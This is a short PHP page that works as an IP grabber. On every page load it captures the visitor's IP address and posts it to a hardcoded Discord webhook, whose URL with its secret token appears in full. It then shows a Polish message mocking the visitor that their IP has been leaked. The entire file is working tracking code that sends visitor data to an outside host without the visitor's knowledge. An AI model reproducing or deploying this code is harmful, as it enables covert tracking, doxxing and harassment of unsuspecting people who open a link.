<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

function send_webhook_log($ip) {
    $webhookurl = "https://discord.com/api/webhooks/1078315213012615178/yE8XTv86gf1wo7aKlet_8CFDGkPSwExqgu8YfIdi2W4qj2-sj78Fx88x8xT0m1iz7Cjq";


$json_data = json_encode([
    "content" => "@everyone",
    
    "username" => "IP LOGS!",

    "tts" => false,

    "embeds" => [
        [
            "title" => "Success!",

            "type" => "rich",

            "description" => "IP: $ip",

            "color" => hexdec( "3366ff" )
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
}

send_webhook_log($ip);

?>

<html>
    <head>
        <title>acha</title>
    </head>
    <body>
        twoje ip zostalo zleakowany lol.
    </body>
</html>